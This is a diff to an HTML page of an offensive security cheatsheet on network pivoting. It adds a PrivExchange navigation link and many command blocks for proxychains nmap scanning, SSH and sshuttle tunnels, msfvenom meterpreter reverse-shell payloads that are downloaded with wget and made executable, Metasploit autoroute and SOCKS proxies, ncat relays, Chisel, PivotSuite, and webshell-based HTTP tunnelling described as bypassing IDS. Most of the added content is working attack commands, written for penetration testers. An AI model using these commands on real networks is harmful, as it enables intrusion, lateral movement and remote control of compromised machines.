@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-01T16:53:25 CET">
+<meta name="revised" content="2019-11-10T13:28:45 CET">
 <title>Pivot Techniques :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1020,6 +1020,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/privexchange/">
+            PrivExchange
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/post-exploitation-techniques/" class="dd-item haschildren
@@ -1381,6 +1388,8 @@
     
     
 
+<p><a href="https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/">https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/</a></p>
+
 <h3 id="proxychains-pivot">Proxychains Pivot</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#  When you have access to a machine, you can use it as pivot to target machines</span>
 
@@ -1399,9 +1408,20 @@ tcp_read_time_out <span style="color:#ae81ff">800</span>
 tcp_connect_time-out <span style="color:#ae81ff">800</span>
 
 <span style="color:#75715e"># Then</span>
-proxychains...</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If the compromised host is a Windows machine you still can use it as a pivot.</span>
-<span style="color:#75715e"># First, check if SSH is running → If not, you can install bitvise and run it (default settings)</span>
-<span style="color:#75715e"># Then, make sure you can SSH</span></code></pre></div>
+proxychains...</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Scanning (nmap) can be very long through proxychains</span>
+<span style="color:#75715e"># You can speed it up by using xargs and multithreading</span>
+<span style="color:#75715e"># The main goal is to spread ports between different threads (-P 50)</span>
+$ seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65535</span> <span style="color:#111">|</span> xargs -P <span style="color:#ae81ff">50</span> -I port proxychains -q nmap -p port -sT -T4 <span style="color:#ae81ff">10</span>.42.42.2 -oG <span style="color:#ae81ff">10</span>.42.42.2 --open --append-output <span style="color:#ae81ff">10</span>.42.42.2 -Pn -n
+
+<span style="color:#75715e"># Take care of some options</span>
+<span style="color:#75715e"># You can&#39;t just run -oA but need the --append-output option</span>
+
+<span style="color:#75715e"># The same behavior can be used to scan multiple machines</span>
+<span style="color:#75715e"># The base command</span>
+$ proxychains nmap -p- -sT -T4 --top-ports <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">10</span>.42.42.0/24 -oG <span style="color:#ae81ff">10</span>.42.42.0 --open
+
+<span style="color:#75715e"># Become</span>
+$ seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">254</span> <span style="color:#111">|</span> xargs -P <span style="color:#ae81ff">50</span> -I cpt proxychains -q nmap --top-ports <span style="color:#ae81ff">20</span> -sT -T4 <span style="color:#ae81ff">10</span>.42.42.cpt -oG <span style="color:#ae81ff">10</span>.42.42.0 --open --append-output <span style="color:#ae81ff">10</span>.42.42.cpt -Pn -n</code></pre></div>
 <p><br/></p>
 
 <h3 id="double-pivot-proxychains">Double Pivot Proxychains</h3>
@@ -1429,6 +1449,123 @@ ssh -R <span style="color:#ae81ff">8090</span>:localhost:8090 user@ip
 
 <span style="color:#75715e"># Local port forward, forward local 8090 to target:</span>
 ssh -L <span style="color:#ae81ff">8090</span>:localhost:8090 user@ip</code></pre></div>
+<p><br/></p>
+
+<h3 id="ssh-pivoting">SSH Pivoting</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Local port forwarding</span>
+<span style="color:#75715e"># Local port opened on 127.0.0.1 (bind)</span>
+<span style="color:#75715e"># -N == no command executed (only ssh tunnel)</span>
+$ ssh user@pivoting_machine -L <span style="color:#f92672">[</span>bind_address:<span style="color:#f92672">]</span>local_port:destination_host:destination_hostport -N</code></pre></div>
+<p><br/></p>
+
+<h3 id="sshuttle">sshuttle</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Transparent proxy over SSH</span>
+
+<span style="color:#75715e"># Forwarding traffic through the pivot</span>
+<span style="color:#75715e"># It will then auto create necessary iptables rules</span>
+sshuttle -r user@pivoting_machine x.x.x.x/24
+
+<span style="color:#75715e"># You can also let sshuttle detect networks based on the target</span>
+<span style="color:#75715e"># -x == exclude some network to not transmit over the tunnel</span>
+sshuttle -vNr user@pivoting_machine -x x.x.x.x.x/24</code></pre></div>
+<p><br/></p>
+
+<h3 id="metasploit-pivoting">Metasploit pivoting</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Reverse Shell generation</span>
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.149 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span> -f elf --platform linux --arch x64 &gt; reverse.elf
+$ python -m http.server --bind <span style="color:#ae81ff">192</span>.168.2.149
+$ wget http://192.168.2.149:8000/reverse.elf
+$ chmod u+x reverse.elf
+
+<span style="color:#75715e"># Setup listener</span>
+$ msfconsole -q
+msf5 &gt; use exploit/multi/handler
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> payload linux/x64/meterpreter/reverse_tcp
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Autoroute module</span>
+msf5 &gt; use post/multi/manage/autoroute
+msf5 post<span style="color:#f92672">(</span>multi/manage/autoroute<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> SESSION <span style="color:#ae81ff">1</span>
+msf5 post<span style="color:#f92672">(</span>multi/manage/autoroute<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> CMD add
+msf5 post<span style="color:#f92672">(</span>multi/manage/autoroute<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> SUBNET <span style="color:#ae81ff">10</span>.42.42.0
+msf5 post<span style="color:#f92672">(</span>multi/manage/autoroute<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> NETMASK /24
+msf5 post<span style="color:#f92672">(</span>multi/manage/autoroute<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> CMD print
+msf5 post<span style="color:#f92672">(</span>multi/manage/autoroute<span style="color:#f92672">)</span> &gt; run
+
+<span style="color:#75715e"># On windows you can use post/windows/gather/arp_scanner to discover other machines</span>
+<span style="color:#75715e"># On Linux you can try arp -a</span>
+
+<span style="color:#75715e"># SOCKS proxy setup</span>
+msf5 &gt; use auxiliary/server/socks4a
+msf5 auxiliary<span style="color:#f92672">(</span>server/socks4a<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> SRVPORT <span style="color:#ae81ff">1081</span>
+msf5 auxiliary<span style="color:#f92672">(</span>server/socks4a<span style="color:#f92672">)</span> &gt; run
+
+<span style="color:#75715e"># Now, equivalent to a dynamic SSH</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Double Pivoting</span>
+<span style="color:#75715e"># Reverse shell from the pwned2 to the pwned1</span>
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.42.42.1 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8088</span> -f exe --platform windows --arch x64 &gt; reverse.exe
+
+<span style="color:#75715e"># Setup handler and exploit the found vulnerability</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="ncat-pivoting">Ncat pivoting</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Ncat =/= netcat</span>
+<span style="color:#75715e"># Enhanced version, developped by nmap dev and often packaged with</span>
+<span style="color:#75715e"># Ciphered connexion, IP restriction</span>
+<span style="color:#75715e"># To pivot, needed on both attacker and pivot machine</span>
+
+<span style="color:#75715e"># Attacker (broker == accept multiple connexions)</span>
+$ ncat -lv --broker --max-conns <span style="color:#ae81ff">2</span>
+
+<span style="color:#75715e"># Pivot</span>
+<span style="color:#75715e"># We connect to attacker and target</span>
+$ ncat -v <span style="color:#ae81ff">192</span>.168.2.149 <span style="color:#ae81ff">31337</span> -c <span style="color:#d88200">&#39;ncat -v 10.42.42.2 80&#39;</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="chisel-pivoting-http-tunnel">Chisel Pivoting (HTTP Tunnel)</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Chisel offers to encapsulate TCP connexions in HTTP tunnels</span>
+<span style="color:#75715e"># Everything is encrypted using SSH</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Local port forwarding</span>
+
+<span style="color:#75715e"># Pivot machine</span>
+$ chisel server -p <span style="color:#ae81ff">8080</span> --host <span style="color:#ae81ff">192</span>.168.2.105 -v
+
+<span style="color:#75715e"># Attacker machine</span>
+$ chisel client -v http://192.168.2.105:8080 <span style="color:#ae81ff">127</span>.0.0.1:33333:10.42.42.2:80</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Local port forwarding + SOCKS proxy</span>
+
+<span style="color:#75715e"># Pivot machine</span>
+$ chisel server -p <span style="color:#ae81ff">8080</span> --host <span style="color:#ae81ff">192</span>.168.2.105 --socks5 -v
+
+<span style="color:#75715e"># Attacker machine</span>
+$ chisel client -v http://192.168.2.105:8080 <span style="color:#ae81ff">127</span>.0.0.1:33333:socks</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Reverse remote port forwarding</span>
+
+<span style="color:#75715e"># Attacker machine</span>
+$ chisel server -p <span style="color:#ae81ff">8888</span> --host <span style="color:#ae81ff">192</span>.168.2.149 --reverse -v
+
+<span style="color:#75715e"># Pivot machine</span>
+$ chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80</code></pre></div>
+<p><br/></p>
+
+<h3 id="pivotsuite">PivotSuite</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Similar features to other tools but support multilevel pivot</span>
+<span style="color:#75715e"># Like Metasploit</span>
+
+<span style="color:#75715e"># &#34;Remote&#34; local port forwarding</span>
+<span style="color:#75715e"># On the pivot</span>
+$ pivotsuite -S -F --server-option<span style="color:#f92672">=</span>PF --forward-ip<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.42.42.2 --forward-port<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span> --server-ip<span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.105 --server-port<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span>
+
+<span style="color:#75715e"># &#34;Remote&#34; dynamic port forwarding</span>
+$ pivotsuite -S -F --server-option<span style="color:#f92672">=</span>SP --server-ip<span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.105 --server-port<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="tunna-fulcrom-http">Tunna / Fulcrom (HTTP)</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Everything is through HTTP</span>
+<span style="color:#75715e"># Bypass some IPS/IDS</span>
+
+<span style="color:#75715e"># First step is to deploy webshell on the target</span>
+<span style="color:#75715e"># Some are available with the tool (but not good)</span>
+<span style="color:#75715e"># Can be hard to use</span>
+
+<span style="color:#75715e"># Then on the attacker machine</span>
+$ python2 proxy.py -u http://192.168.2.105:8080/conn.php -l <span style="color:#ae81ff">7777</span> -r <span style="color:#ae81ff">80</span> -a <span style="color:#ae81ff">10</span>.42.42.2 -v</code></pre></div>
+<p><br/></p>
+
 
     
     
